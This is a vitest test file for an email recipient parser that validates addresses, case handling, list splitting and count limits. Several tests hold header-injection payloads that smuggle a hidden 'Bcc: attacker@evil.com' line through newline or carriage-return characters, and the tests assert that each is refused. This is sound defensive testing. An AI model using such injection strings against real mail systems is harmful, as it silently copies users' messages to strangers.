import { describe, it, expect } from 'vitest';
import { parseRecipient, parseRecipientList, looksLikeAddress } from '../src/recipients.js';

/**
 * Where a message goes.
 *
 * The only field in this product where a mistake is unrecoverable. A wrong
 * summary is annoying and a wrong draft is caught by the confirmation the user
 * reads — but a wrong recipient means their words arriving at a stranger, and
 * there is no recall. So this file is mostly about refusing, and the refusals
 * are the assertions that matter.
 *
 * The header-injection cases are not hypothetical. A recipient is interpolated
 * into a `To:` header; a newline inside it ends that header and starts another,
 * so `alice@x.com\nBcc: attacker@evil.com` is a silent copy of every message to
 * an address the user never saw.
 */

describe('a single recipient', () => {
  it('accepts an ordinary address', () => {
    expect(parseRecipient('alice@acme.com')).toEqual({ address: 'alice@acme.com' });
  });

  it('accepts the form people paste out of a mail client', () => {
    expect(parseRecipient('Alice Chen <alice@acme.com>')).toEqual({
      address: 'alice@acme.com',
      name: 'Alice Chen',
    });
  });

  it('strips the quotes a client puts around a display name', () => {
    expect(parseRecipient('"Chen, Alice" <alice@acme.com>')).toMatchObject({
      name: 'Chen, Alice',
    });
  });

  it('trims surrounding whitespace rather than refusing over it', () => {
    expect(parseRecipient('   alice@acme.com  ')).toEqual({ address: 'alice@acme.com' });
  });
});

describe('header injection', () => {
  it('refuses a newline, which would start a second header', () => {
    // The whole reason this module exists.
    expect(() => parseRecipient('alice@acme.com\nBcc: attacker@evil.com')).toThrow();
  });

  it('refuses a carriage return', () => {
    expect(() => parseRecipient('alice@acme.com\r\nBcc: attacker@evil.com')).toThrow();
  });

  it('refuses a null byte', () => {
    expect(() => parseRecipient('alice@acme.com\0')).toThrow();
  });

  it('refuses control characters hidden in a display name', () => {
    expect(() => parseRecipient('Alice\r\nBcc: x@evil.com <alice@acme.com>')).toThrow();
  });

  it('checks for control characters before length, so a long payload is named correctly', () => {
    // "Too long" would be the wrong thing to tell anyone about an injection.
    const error = capture(() => parseRecipient(`${'a'.repeat(400)}\nBcc: x@evil.com`));

    expect(error.message).toContain('control character');
    expect(error.message).not.toContain('too long');
  });

  it('refuses injection inside a list', () => {
    expect(() => parseRecipientList('alice@acme.com, bob@acme.com\nBcc: x@evil.com')).toThrow();
  });
});

describe('what is refused', () => {
  it('refuses text that is not an address at all', () => {
    for (const bad of ['alice', 'alice@', '@acme.com', 'alice at acme dot com', 'acme.com']) {
      expect(() => parseRecipient(bad), bad).toThrow();
    }
  });

  it('refuses an address with no dot in the domain', () => {
    // `alice@localhost` is deliverable inside a network and never what a person
    // typing into WhatsApp meant.
    expect(() => parseRecipient('alice@localhost')).toThrow();
  });

  it('refuses an empty string with a question rather than a validation error', () => {
    const error = capture(() => parseRecipient('   '));

    expect(error.publicMessage).toContain('Who should I send it to?');
  });

  it('refuses something longer than a deliverable address', () => {
    expect(() => parseRecipient(`${'a'.repeat(250)}@acme.com`)).toThrow();
  });

  it('names the address back, because "invalid" alone is useless with three of them', () => {
    const error = capture(() => parseRecipient('not-an-address'));

    expect(error.publicMessage).toContain('not-an-address');
  });

  it('does not echo an unbounded string into the message it shows a user', () => {
    const error = capture(() => parseRecipient(`${'x'.repeat(200)}@`));

    expect(error.publicMessage!.length).toBeLessThan(120);
  });
});

describe('case', () => {
  it('lowercases the domain, which is case-insensitive by definition', () => {
    expect(parseRecipient('alice@ACME.COM').address).toBe('alice@acme.com');
  });

  it('preserves the local part, which the receiving server owns', () => {
    // RFC 5321: the local part's meaning belongs to the destination. Almost
    // every provider treats it insensitively anyway — the point is that
    // preserving cannot break delivery and lowercasing, in principle, can.
    expect(parseRecipient('Alice.Chen@acme.com').address).toBe('Alice.Chen@acme.com');
  });
});

describe('several recipients', () => {
  it('splits on commas and semicolons', () => {
    expect(parseRecipientList('a@x.com, b@x.com; c@x.com').map((r) => r.address)).toEqual([
      'a@x.com',
      'b@x.com',
      'c@x.com',
    ]);
  });

  it('does not split a comma inside a display name', () => {
    // "Chen, Alice <alice@x.com>" is one recipient. Splitting it produces two
    // unparseable fragments out of something perfectly valid.
    const parsed = parseRecipientList('"Chen, Alice" <alice@x.com>, bob@x.com');

    expect(parsed).toHaveLength(2);
    expect(parsed[0]).toMatchObject({ address: 'alice@x.com', name: 'Chen, Alice' });
  });

  it('de-duplicates, so nobody is visibly listed twice', () => {
    expect(parseRecipientList('a@x.com, A@X.COM').map((r) => r.address)).toEqual(['a@x.com']);
  });

  it('bounds the count', () => {
    // A compose flow is not a mailing list. Forty addresses pasted into a chat
    // is a mistake or something this product should not make easy.
    const many = Array.from({ length: 40 }, (_, i) => `user${i}@x.com`).join(', ');

    expect(() => parseRecipientList(many)).toThrow();
  });

  it('says how many there were and what the limit is', () => {
    const many = Array.from({ length: 12 }, (_, i) => `user${i}@x.com`).join(', ');
    const error = capture(() => parseRecipientList(many));

    expect(error.publicMessage).toContain('12');
    expect(error.publicMessage).toContain('10');
  });

  it('refuses the whole list when one entry is bad, rather than sending to the rest', () => {
    // Silently dropping one recipient is a message the user believes went to
    // three people and went to two.
    expect(() => parseRecipientList('a@x.com, nonsense, c@x.com')).toThrow();
  });

  it('ignores trailing separators rather than refusing over them', () => {
    expect(parseRecipientList('a@x.com, b@x.com,').map((r) => r.address)).toEqual([
      'a@x.com',
      'b@x.com',
    ]);
  });
});

describe('telling a typo from a non-address', () => {
  it('recognises something that was meant to be an address', () => {
    // Routes to "that address is wrong" rather than "who do you mean?".
    expect(looksLikeAddress('alice@acme')).toBe(true);
    expect(looksLikeAddress('  bob@x  ')).toBe(true);
  });

  it('does not mistake ordinary words for one', () => {
    expect(looksLikeAddress('the invoice from tom')).toBe(false);
    expect(looksLikeAddress('')).toBe(false);
  });
});

/* --------------------------------- helpers -------------------------------- */

interface Refusal extends Error {
  publicMessage?: string;
}

function capture(fn: () => unknown): Refusal {
  try {
    fn();
  } catch (err) {
    return err as Refusal;
  }
  throw new Error('expected a refusal, but it was accepted');
}
